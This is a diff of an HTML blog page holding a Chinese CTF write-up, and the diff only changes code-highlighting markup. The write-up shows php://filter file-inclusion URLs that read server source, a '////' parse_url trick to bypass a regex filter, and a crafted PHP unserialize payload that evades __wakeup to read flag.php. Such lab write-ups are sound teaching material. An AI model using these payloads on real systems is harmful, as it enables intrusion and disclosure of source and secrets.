@@ -418,13 +418,13 @@ Missing parameter<span class="token tag"><span class="token tag"><span class="to
 <pre class=" language-vim"><code class="language-vim">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>changame<span class="token operator">.</span>ichunqiu<span class="token operator">.</span><span class="token builtin">com</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span><span class="token keyword">file</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token operator">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>index<span class="token operator">.</span>php
 </code></pre>
 <p>然后得到其base64编码的源码，然后解码如下代码：</p>
-<pre class=" language-php5"><code class="language-php5"><html>
-<?php
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token prolog">&lt;?php
 error_reporting(0); 
 $file = $_GET["file"]; 
 $payload = $_GET["payload"];
 if(!isset($file)){
-    echo 'Missing parameter'.'<br>';
+    echo 'Missing parameter'.'&lt;br>';
 }
 if(preg_match("/flag/",$file)){
     die('hack attacked!!!');
@@ -443,10 +443,10 @@ if(isset($payload)){
 }else{ 
    echo "Missing parameters"; 
 } 
-?>
-<!--Please test index.php?file=xxx.php -->
-<!--Please get the source of hint.php-->
-</html>
+?></span>
+<span class="token comment" spellcheck="true">&lt;!--Please test index.php?file=xxx.php --></span>
+<span class="token comment" spellcheck="true">&lt;!--Please get the source of hint.php--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
 </code></pre>
 <p>然后继续使用伪协议读取hint.php文件如下：</p>
 <p><a href="http://changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=hint.php</a><br>解码base64如下：</p>
@@ -507,14 +507,14 @@ class Flag{
 </code></pre>
 <p>使用如下的url：[<a href="http://changame.ichunqiu.com////index.php?file=hint.php&amp;payload=],主要是通过host后面////，" target="_blank" rel="noopener">http://changame.ichunqiu.com////index.php?file=hint.php&amp;payload=],主要是通过host后面////，</a></p>
 <p>来使得上面的正则匹配绕过<code>preg_match(&quot;/flag/&quot;,$value)</code>，这里<code>$url = parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</code>,后得到的$url是：<code>string &#39;////ichunqiu.php?file=demo.php&amp;payload=</code>，然后<code>parse_str($url[&#39;query&#39;],$query);</code>，就得到query为：<code>boolean false</code>,然后再经过 <code>foreach($query as $value)</code>,这时候value已经变成</p>
-<pre class=" language-vbscript"><code class="language-vbscript">array (size=0)
+<pre class=" language-php5"><code class="language-php5">array (size=0)
   empty
 </code></pre>
 <p>这时候正则匹配已然绕过，payload我们是通过get方法在开始已经获得的。这个时候我们得构造我们的payload了。仔细审计hint.php中的两个类， <code>__wakeup()</code>这个魔术方法在<code>unserialize($payload);</code>的时候创建完对象Handle后就会调用，这个时候它会将类里面的属性置空：</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+<pre class=" language-php5"><code class="language-php5">foreach(get_object_vars($this) as $k => $v) {
+            $this->$k = null;
 
-        <span class="token punctuation">}</span>
+        }
 </code></pre>
 <p>这个时候在这个类的生命周期结束的时候，执行析构函数的时候，就不会执行Flag对象的getFlag函数，那么这个如何绕过呢？</p>
 <p>我们可以将这个对象的属性个数变成2个，原理是被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。参考</p>
@@ -525,7 +525,7 @@ class Flag{
 <pre class=" language-groovy"><code class="language-groovy">payload<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"Handle"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Handle%00handle"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"token_flag"</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
 </code></pre>
 <p>0:6指的是对象名长度是6，Handle:2是Handle类里面有两个属性（原本是1但是为了绕过魔术方法_wake_up改成2），然后s:14是说明Handle的特殊属性handle，因为是私有属性所以是前面有一个Handle，0:4是Flag对象，后面不赘余，主要解释下：<code>&quot;token&quot;;N;</code>指的是token为空，因为在构造函数里面是通过md5生成的，所以这边我们给它置空，<code>s:10:&quot;token_flag&quot;;R:4;</code>,这个是token_flag是一个Flag类的属性，且由于<code>$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</code>,这个赋值从右向左执行，那么token_flag它对应的是token属性的引用，所以是R，4是指的是token这个引用第一次出现在序列化对象的第几个，在这个<code>O:4:&quot;Flag&quot;:3:s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}</code>中，Flag是第一个，file是第二，flag.php是第三，所以token是第四个，那么R后面就跟着4.</p>
-<h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>首先从文件包含漏洞，使用伪协议读取源码，然后解码base64得到php源码，接下来审计源码发现存在反序列化漏洞，然后绕过index.php中对路径中的参数对字符串flag的检测(防止直接通过文件包含得到源码)，然后再绕过_wakeup魔术方法，这个方法主要是在反序列化得到对象后执行，这个方法将会使得handle属性为空，从而使得在析构函数不能执行Flag实例的getflag方法，所以通过增加Handle的属性绕过。</p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>首先从文件包含漏洞，使用伪协议读取源码，然后解码base64得到php源码，接下来审计源码发现存在反序列化漏洞，然后绕过index.php中对路径中的参数对字符串flag的检测(防止直接通过文件包含得到源码)，然后再绕过_wakeup魔术方法，这个方法主要是在反序列化得到对象后执行，这个方法将会使得handle属性为空，从而使得在析构函数不能执行Flag实例的getflag方法，所以通过增加Handle的属性绕过。</p>
 
             </div>
             <hr>
